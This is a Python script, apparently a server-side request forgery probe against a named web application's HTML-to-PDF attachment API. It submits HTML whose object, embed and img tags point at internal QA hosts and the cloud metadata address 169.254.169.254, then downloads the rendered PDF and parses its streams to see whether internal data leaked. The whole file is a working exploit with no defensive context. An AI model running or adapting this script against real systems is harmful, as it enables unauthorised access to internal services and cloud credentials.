import json,subprocess,os,re,zlib,uuid
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']; WH=os.environ['WH']
def req(method,path,body=None):
    cmd=['curl','-s','-m','150','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+T,'-H',BB,'-H','Content-Type: application/json']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
def render(html,name,typ='pdf'):
    c,b=req('POST','/api/v1/attachments/html',
        {"html":html,"type":typ,"attachableType":"Narrative","attachableId":"31","fileName":name})
    if c!='200': return c,None,b
    aid=json.loads(b)['attachmentId']
    c2,b2=req('GET',f'/api/v1/attachments/{aid}')
    fid=json.loads(b2)['attachments'][0]['file_id']
    c3,b3=req('GET',f'/api/v1/files/{fid}')
    return c,(aid,fid,json.loads(b3)['files'][0]['url']),b
def grab(url,ext='pdf'):
    p=f'/tmp/rb.{ext}'
    subprocess.run(['curl','-s','-m','60','-o',p,url])
    return open(p,'rb').read()
def textof(data,ext):
    if ext=='pdf':
        out=[]
        for m in re.finditer(rb'stream\r?\n(.*?)endstream',data,re.S):
            try: out.append(zlib.decompress(m.group(1)).decode('latin-1'))
            except: pass
        return '\n'.join(out)
    return data.decode('latin-1',errors='replace')

# object/embed + redirector to internal, pdf
html=('<h1>ZX</h1>'
      '<object data="http://integrations.qa.soxhubapp.com/version" type="text/html" width="900" height="600"></object>'
      '<embed src="http://integrations.qa.soxhubapp.com/api/v1/health" width="900" height="300">'
      '<img src="http://169.254.169.254/latest/meta-data/">')
c,meta,b=render(html,'zx-rb1','pdf')
print("render:",c,meta[:2] if meta else b[:200])
if meta:
    d=grab(meta[2],'pdf'); t=textof(d,'pdf')
    print("  pdf bytes",len(d),"content len",len(t))
    print("  v1.16.1 in pdf:", 'v1.16.1' in t)
    print("  Tj count:", t.count('Tj'))
